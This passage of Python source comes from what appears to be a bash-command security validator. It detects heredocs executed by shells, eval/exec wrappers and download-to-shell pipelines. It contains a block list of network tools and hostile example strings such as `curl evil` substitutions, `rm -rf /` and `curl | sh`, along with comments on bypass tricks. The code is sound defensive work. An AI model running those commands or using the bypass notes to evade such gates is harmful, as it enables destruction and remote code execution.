            return False
        return (command[start] == '"' and command[end - 1] == '"') or (command[start] == "'" and command[end - 1] == "'")

    def extract_heredoc_ranges(self, command: str, ast_nodes: list[Any]) -> list[tuple]:
        """Extract heredoc content ranges that should NOT be pattern matched.

        SECURITY: Heredoc content is only TEXT unless piped to a shell.
        'cat << EOF' outputs text, 'bash << EOF' executes it.

        Args:
            command: Original command string
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of (start, end, is_shell) tuples for heredoc content ranges.
            is_shell=True means the heredoc will be executed by a shell.
        """
        heredoc_ranges = []

        def visit(node, parent_cmd=None, in_process=False):
            """Recursively visit AST nodes to find heredocs."""
            if hasattr(node, "kind"):
                # A heredoc under an unquoted process substitution feeds `cat` (inert), but the
                # command that READS `<( … )` may run what it prints - `bash <(cat <<EOF … )`,
                # `source <( … )` - so its body is code, exactly as the quoted twin is treated
                # None in `_bashlex_heredocs`. Mark every heredoc below the procsub is_shell
                # (LAB-5180). The reader is not known here, so this over-reads rather than
                # trusting the inner command's name.
                if node.kind == "processsubstitution":
                    in_process = True

                # Track command name for determining if heredoc goes to shell
                cmd_name = None
                if node.kind == "command" and hasattr(node, "parts") and node.parts:
                    cmd_name = heredoc_owner(node)

                # Check for redirect nodes with heredocs
                if node.kind == "redirect" and hasattr(node, "heredoc"):
                    heredoc = node.heredoc
                    if hasattr(heredoc, "pos"):
                        start, end = heredoc.pos
                        is_shell = in_process or (parent_cmd in _HEREDOC_SHELL_COMMANDS if parent_cmd else False)
                        heredoc_ranges.append((start, end, is_shell))

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item, cmd_name or parent_cmd, in_process)
                        elif child:
                            visit(child, cmd_name or parent_cmd, in_process)

        for node in ast_nodes or []:
            visit(node)

        return heredoc_ranges

    def extract_string_literals(self, command: str, ast_nodes: list[Any]) -> list[tuple]:
        """Extract quoted string literals from AST with their positions.

        This method identifies strings that won't be executed (quoted literals)
        vs strings that will be executed. Used to avoid false positives when
        dangerous patterns appear in documentation, commit messages, or echo statements.

        Args:
            command: Original command string (needed for position mapping)
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of (start_pos, end_pos) tuples for each quoted string literal

        PARITY (LAB-1584): a range found STRICTLY INSIDE a `parameter` node's span
        is discarded. Suppression ranges shrink the danger surface, so the native
        tier must never derive one the bashlex tier would not — and bashlex's
        `parameter` node is childless, so it derives none from inside `${…}` at
        any depth. The native tier splices the words a `${…}` EVALUATES in beside
        the parameter node (`AstView._param_exp_words`, so SubstitutionValidator
        can see `${z:-$(curl evil)}`); without this filter the quoted words in
        that spliced subtree would mask rule matches bashlex still catches, e.g.
        `echo ${z:-$(echo "rm -rf /")}`. STRICTLY inside is the whole contract:
        `echo "$x"` has word (5,9) → range (6,8) and parameter (6,8), a range
        bashlex derives too, and equality keeps it. On the bashlex tier the filter
        is a no-op — a childless node's span can contain no other node.

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse('echo "rm -rf /"')
            >>> literals = parser.extract_string_literals('echo "rm -rf /"', ast)
            >>> # literals = [(6, 14)]  # Position of content inside quotes
        """
        words, parameter_spans = self._quoted_words(command, ast_nodes)
        # Record the position INSIDE the quotes (exclude quote chars).
        # _is_quoted_span's own `end - start < 2` check rules out the
        # empty-quote span that would invert this range.
        string_literals = [(word.pos[0] + 1, word.pos[1] - 1) for word in words]
        if not parameter_spans:
            return string_literals
        return self._drop_ranges_inside(string_literals, parameter_spans)

    def _quoted_words(self, command: str, ast_nodes: list[Any]) -> tuple[list[Any], list[tuple]]:
        """Every word node whose span is quoted, and every `parameter` span, in walk order.

        The one definition of which words earn a suppression range. It is shared
        with extract_quoted_substitution_bodies because that pass exists to cover
        exactly those words: a walk widened for one and not the other suppresses a
        body with nothing matching it.
        """
        words: list[Any] = []
        parameter_spans: list[tuple] = []

        def visit(node):
            """Recursively visit AST nodes to find quoted strings."""
            if hasattr(node, "kind"):
                # `parameter` ONLY — widening this to `commandsubstitution` would
                # suppress every quoted literal inside `$(…)` on BOTH tiers, which
                # is the under-block this filter exists to prevent.
                if node.kind == "parameter" and hasattr(node, "pos"):
                    parameter_spans.append(node.pos)

                if node.kind == "word" and hasattr(node, "pos") and self._is_quoted_span(command, node.pos):
                    words.append(node)

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)
        return words, parameter_spans

    def extract_quoted_substitution_bodies(self, command: str, ast_nodes: list[Any]) -> list[CommandSegment]:
        """The body of each substitution inside a quoted word, as a segment of its own.

        SECURITY: extract_string_literals gives a quoted word ONE range, so the raw
        pass suppresses a `"$(…)"` body along with the rest of the word. The only
        other view of that body is SubstitutionValidator's word view, where the
        quotes are already gone, so a rule that reads quote characters has no text
        that shows them: `"$(IFS=' ,'; …)"` reads as `IFS= ,`, an empty IFS.
        Matching each body raw, with its own ranges, gives it the view a bare
        `$(…)` already gets from the raw pass. Bodies get the raw pass only: the
        quote-stripped form of a body is SubstitutionValidator's word view.

        The word keeps its range on purpose. Cutting the substitution out of it
        instead exposes the `$(` itself, and a rule written against bare
        substitutions (`command_substitution_dangerous`) then reads
        `"$(grep -rn 'rm -rf' src/)"` as the command it searches for.

        Offsets come from the substitution's own span, never its inner command:
        bashlex ends the inner command at the first newline, and inside a word
        each `\\<newline>` moves every later inner offset two places early. The
        word's own span is exact, so a word holding a newline, or a substitution
        whose closer is not where _body_end looks, gets ONE body, from its first
        substitution to its closing quote. That body keeps its heredoc
        ranges only while no `\\<newline>` has moved them, and never its literal
        ranges, which is a false positive on a quoted argument in a multi-line
        body and never a missed payload.

        Raises:
            ValueError: past _MAX_BODY_TEXT_FACTOR times the command's length in
                body text. Nested bodies are scanned once per enclosing body, and
                a hook that outlives its timeout fails open (fail closed).
        """
        bodies: list[CommandSegment] = []
        whole_until = -1  # end of the last multi-line word, already one body
        budget = _MAX_BODY_TEXT_FACTOR * len(command)
        words, _ = self._quoted_words(command, ast_nodes)
        for word in words:
            word_start, word_end = word.pos
            code = [
                part
                for part in getattr(word, "parts", None) or ()
                if getattr(part, "kind", None) in ("commandsubstitution", "processsubstitution") and getattr(part, "pos", None)
            ]
            if not code or word_start < whole_until:
                continue
            text = command[word_start:word_end]
            found = [] if "\n" in text else [self._body_end(command, part.pos) for part in code]
            ends = [end for end in found if end is not None]
            if len(ends) < len(code):
                whole_until = word_end
                first = code[0].pos[0]
                start = word_start + 1 if "\\\n" in command[word_start:first] else self._body_start(command, first)
                heredocs = [] if "\\\n" in text else self.extract_heredoc_ranges(command, [word])
                spans = [(start, word_end - 1, [], heredocs)]
            else:
                spans = [
                    (
                        self._body_start(command, part.pos[0]),
                        end,
                        self.extract_string_literals(command, [part]),
                        self.extract_heredoc_ranges(command, [part]),
                    )
                    for part, end in zip(code, ends)
                ]
            for start, end, literals, heredocs in spans:
                budget -= end - start
                if budget < 0:
                    raise ValueError(f"Quoted substitution bodies exceed {_MAX_BODY_TEXT_FACTOR}x the command's length")
                bodies.append(
                    CommandSegment(
                        text=command[start:end],
                        string_literals=self._rebase(literals, start, end),
                        heredoc_ranges=self._rebase(heredocs, start, end),
                        node=word,
                    )
                )
        return bodies

    @staticmethod
    def _body_start(command: str, part_start: int) -> int:
        """Where a substitution's body begins: past a backtick, or past `$(`, `<(` or `>(`."""
        return part_start + (1 if command[part_start] == "`" else 2)

    @staticmethod
    def _body_end(command: str, span: tuple) -> Optional[int]:
        """Offset of a substitution's closing delimiter, or None if it is not where bashlex says.

        bashlex ends a substitution's span on the first blank of a trailing run
        (`$(x    )` spans `$(x `), so the closer is found by skipping blanks.
        """
        closer = "`" if command[span[0]] == "`" else ")"
        end = span[1] - 1
        while command[end : end + 1] in (" ", "\t"):
            end += 1
        return end if command[end : end + 1] == closer else None

    @staticmethod
    def _drop_ranges_inside(ranges: list[tuple], spans: list[tuple]) -> list[tuple]:
        """Ranges from `ranges` lying STRICTLY inside no span — see `extract_string_literals`.

        The naive `any(...)` scan is O(ranges x spans), and this runs twice per
        validation (whole command, then again per segment) on a hook that fires
        before every bash call — 43KB of `"a" … $v1 …` padding costs the caller
        nothing and measured 580ms per call, so the quadratic is a stall lever on
        a security gate, not a micro-optimization.

        AST spans NEST but never partially overlap, which makes the fast path
        exact rather than approximate: a range strictly inside a nested span is
        strictly inside that span's outermost ancestor too, so reducing to the
        OUTERMOST spans drops no containment. Those are then pairwise disjoint and
        sorted, so one bisect finds the only span that can contain a range.
        """
        outermost: list[tuple] = []
        for start, stop in sorted(spans, key=lambda span: (span[0], -span[1])):
            if not outermost or start >= outermost[-1][1]:
                outermost.append((start, stop))
        starts = [span[0] for span in outermost]

        kept: list[tuple] = []
        for start, stop in ranges:
            index = bisect.bisect_right(starts, start) - 1
            if index >= 0 and outermost[index][0] < start and stop < outermost[index][1]:
                continue
            kept.append((start, stop))
        return kept

    def has_dangerous_constructs(self, ast_nodes: list[Any]) -> list[str]:
        """Detect dangerous shell constructs in AST.

        Checks for constructs that enable arbitrary code execution:
        - eval/exec commands
        - Remote code execution via curl/wget piped to shell

        Note: Command substitution $(cmd) and process substitution <(cmd) are
        NOT flagged here. They are handled by SubstitutionValidator which uses:
        1. Whitelist of safe commands (op, date, git, pwd, etc.)
        2. AST structural checks for bypass patterns (brace expansion, variables)
        3. Recursive validation with depth limit
        This prevents false positives on 1Password CLI while blocking attacks.

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of warning messages for detected dangerous constructs

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("eval dangerous")
            >>> parser.has_dangerous_constructs(ast)
            ['eval command detected']
        """
        dangers = []

        # Check for dangerous pipelines (curl | sh patterns)
        pipeline_dangers = self._detect_dangerous_pipelines(ast_nodes)
        dangers.extend(pipeline_dangers)

        def _get_all_words(node) -> list[str]:
            """Get ALL words from a command node, skipping assignments/redirects."""
            words = []
            if not hasattr(node, "parts"):
                return words
            for part in node.parts:
                # Skip assignment and redirect prefixes
                if hasattr(part, "kind") and part.kind in ("assignment", "redirect"):
                    continue
                if hasattr(part, "word"):
                    cmd = part.word.split("/")[-1]
                    if cmd:  # Skip empty strings
                        words.append(cmd)
            return words

        def visit_children(node, visitor):
            """Recursively visit child nodes of an AST node."""
            for attr in ("parts", "command", "list", "pipe", "compound"):
                if hasattr(node, attr):
                    child = getattr(node, attr)
                    if isinstance(child, list):
                        for item in child:
                            visitor(item)
                    elif child:
                        visitor(child)

        def visit(node):
            """Recursively visit AST nodes to detect dangerous patterns."""
            if hasattr(node, "kind"):
                # Detect eval/exec as COMMAND NAME only (not arguments)
                # SECURITY: kubectl exec, docker exec use "exec" as argument
                # We must NOT flag those - they're container tools, not shell exec.
                if node.kind == "command":
                    cmd_name = self._get_command_name(node)

                    # Direct eval/exec invocation
                    # EXCEPTION: exec used for FD operations is SAFE
                    # - exec 3>&1 (duplicate FD) - just redirects, no execution
                    # - exec >logfile (redirect stdout) - just redirects
                    # - exec bash (replace process) - DANGEROUS
                    if cmd_name == "exec":
                        words = _get_all_words(node)
                        # If exec has no arguments after it, or only redirects remain
                        # in parts, it's FD manipulation, not process replacement
                        if len(words) <= 1:
                            # Just "exec" with redirects - FD manipulation, safe
                            pass
                        else:
                            # exec followed by words - process replacement, dangerous
                            dangers.append("exec command detected")
                    elif cmd_name == "eval":
                        dangers.append("eval command detected")

                    # Wrapper bypass detection: env exec bash, command exec bash, etc.
                    # SECURITY: Wrappers modify execution context but pass through
                    # Scan all words looking for exec/eval as a command (not as arg to another tool)
                    # Allow: sudo kubectl exec (kubectl handles exec as subcommand)
                    # Block: sudo exec bash (exec IS the command)
                    # NOT the launchers: their `exec`/`eval` is a subcommand (see _LAUNCHER_COMMANDS).
                    elif cmd_name in _EXEC_BYPASS_SCAN_WRAPPERS:
                        words = _get_all_words(node)
                        # Container tools that use "exec" as a subcommand (not shell exec)
                        container_tools = {"kubectl", "docker", "podman", "nerdctl", "crictl", "ctr"}
                        # Scan for exec/eval, but skip if preceded by container tool
                        for word in words[1:]:
                            if word in container_tools:
                                break  # Container tool found, exec is its subcommand
                            if word in ("eval", "exec"):
                                # Found exec/eval before any container tool
                                dangers.append(f"wrapper command bypass: {cmd_name} {word}")
                                break

                # Recursively visit child nodes
                visit_children(node, visit)

        for node in ast_nodes or []:
            visit(node)

        return dangers

    def _detect_dangerous_pipelines(self, ast_nodes: list[Any]) -> list[str]:
        """Detect remote code execution patterns in pipelines via AST.

        SECURITY CRITICAL: Detects patterns like 'curl URL | sh' using AST analysis.
        This is immune to obfuscation techniques that defeat regex patterns:
        - Environment variable prefixes: curl ... | VAR=value sh
        - Redirections: curl ... | sh 2>&1
        - Arguments: curl ... | bash -c
        - Whitespace tricks

        The AST-based detection looks at the actual command structure:
        1. Find pipeline nodes
        2. Extract first command name (download tool?)
        3. Extract subsequent command names (shell interpreter?)

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of warning messages for detected dangerous pipeline patterns
        """
        dangers = []

        # Download tools that fetch remote content
        download_tools = {
            "curl",
            "wget",
            "fetch",
            "aria2c",
            "http",
            "lynx",
            "links",
            "elinks",
            "w3m",  # Text browsers with -dump
            "nc",
            "netcat",
            "ncat",
            "socat",  # Network tools
            "GET",
            "lwp-request",  # Perl LWP tools
            # Additional download vectors (FINDING-001)
            "ftp",
            "tftp",
            "sftp",  # FTP variants
            "scp",
            "rsync",  # Remote copy tools
            "git",
            "svn",
            "hg",  # VCS tools that can fetch remote content
        }

        # Shell interpreters that execute piped input. Reuse the module constant; the
        # download->shell check historically also treated env/xargs as interpreters, so extend
        # locally for THAT check only.
        shell_interpreters = STDIN_EXEC_INTERPRETERS | {"env", "xargs"}

        def _stage_args(part) -> list[str]:
            """Word-args AFTER the command name for a pipeline stage command node."""
            words = []
            seen_name = False
            for sub in getattr(part, "parts", []):
                if getattr(sub, "kind", None) in ("assignment", "redirect"):
                    continue
                if hasattr(sub, "word"):
                    if not seen_name:
                        seen_name = True  # first word is the command name
                        continue
                    words.append(sub.word)
            return words

        def check_pipeline(node):
            """Check a pipeline node for dangerous patterns."""
            if not hasattr(node, "parts"):
                return

            # Extract (command name, args) per command stage, in order.
            stages = []
            for part in node.parts:
                kind = getattr(part, "kind", None)
                # A subshell/group stage (`(bash)`, `{ bash; }`) receives the pipe on its first
                # inner command - classify by that command so a wrapped shell sink is not missed
                # (#97). Inner pipelines within the group are caught separately by the recursive walk.
                stage_node = part if kind == "command" else (_first_command_node(part) if kind == "compound" else None)
                if stage_node is not None:
                    cmd_name = self._get_command_name(stage_node)
                    if cmd_name:
                        # Resolve multicall wrappers (busybox/toybox) to their applet so the
                        # stage is classified by what actually runs (`busybox sh` -> `sh`).
                        stages.append(_resolve_multicall(cmd_name, _stage_args(stage_node)))

            if len(stages) < 2:
                return

            names = [s[0] for s in stages]

            # (1) Existing remote-code-execution pattern: download tool -> shell interpreter.
            first_cmd = names[0]
            if first_cmd in download_tools:
                for subsequent_cmd in names[1:]:
                    if subsequent_cmd in shell_interpreters:
                        dangers.append(f"remote code execution: {first_cmd} piped to {subsequent_cmd}")
                        break

            # (2) Generalized pipe-to-shell: ANY downstream stage that executes its stdin as a
            # program (no program-source arg) is RCE on the piped data, regardless of producer.
            for name, stage_args in stages[1:]:
                if name in STDIN_EXEC_INTERPRETERS and _reads_stdin_as_program(name, stage_args):
                    dangers.append(f"data piped into shell interpreter: {name}")
                    break

        def visit(node):
            """Recursively visit AST to find pipeline nodes."""
            if hasattr(node, "kind"):
                if node.kind == "pipeline":
                    check_pipeline(node)

                # Recurse into child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return dangers
